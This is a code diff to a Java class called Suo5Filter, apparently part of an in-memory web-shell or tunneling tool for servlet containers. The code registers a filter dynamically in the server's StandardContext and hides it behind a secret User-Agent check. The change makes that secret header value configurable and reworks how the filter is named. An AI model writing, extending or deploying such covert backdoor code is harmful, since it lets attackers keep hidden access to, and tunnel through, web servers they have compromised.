@@ -27,7 +27,8 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
     private HashMap parameterMap;
     private ServletContext servletContext;
     private String urlPattern;
-    private String _filterName;
+    private String filterName;
+    private String userAgent;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -64,7 +65,8 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
             this.parameterMap = (HashMap)obj;
             this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
             this.urlPattern = getp("urlPattern");
-            this._filterName = getp("filterName");
+            this.filterName = getp("filterName");
+            this.userAgent = getp("userAgent");
             return true;
         } catch (Exception var3) {
             return false;
@@ -98,7 +100,7 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
         String agent = request.getHeader("User-Agent");
         String contentType = request.getHeader("Content-Type");
 
-        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
+        if (agent == null || !agent.equals(this.userAgent)) {
             if (chain != null) {
                 chain.doFilter(sReq, sResp);
             }
@@ -654,11 +656,8 @@ public class Suo5Filter extends ClassLoader implements Filter, Servlet, ServletC
 
     protected String addFilter(Filter filter, Object standardContext) {
         try {
-            String filterName;
-            if (_filterName.isEmpty()) {
+            if (filterName.isEmpty()) {
                 filterName = filter.getClass().getSimpleName() + System.currentTimeMillis();
-            } else {
-                filterName = _filterName;
             }
             Class standardContextClass = standardContext.getClass();
             ClassLoader standardContextClassLoader = standardContextClass.getClassLoader();
